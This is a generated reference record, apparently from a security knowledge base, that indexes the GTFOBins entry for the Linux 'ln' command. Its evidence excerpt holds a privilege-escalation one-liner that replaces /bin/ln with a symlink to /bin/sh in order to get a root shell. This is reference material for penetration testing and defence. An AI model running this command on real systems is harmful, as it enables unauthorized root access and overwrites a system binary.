---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# ln

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `ln` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ln` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for ln covering privilege-escalation.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/ln.md)
- Source verification: [source record](../../sources/gtfobins/ln.md)

## Aliases

- `ln`

## Source Verification

[source record](../../sources/gtfobins/ln.md)

## Evidence Excerpt

```text
_body: ''
_name: ln
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ln
functions:
privilege-escalation:
- code: 'ln -fs /bin/sh /bin/ln
ln'
comment: This overrides `ln` itself with a symlink to a shell (or any other executable) that is to be executed as root,
```
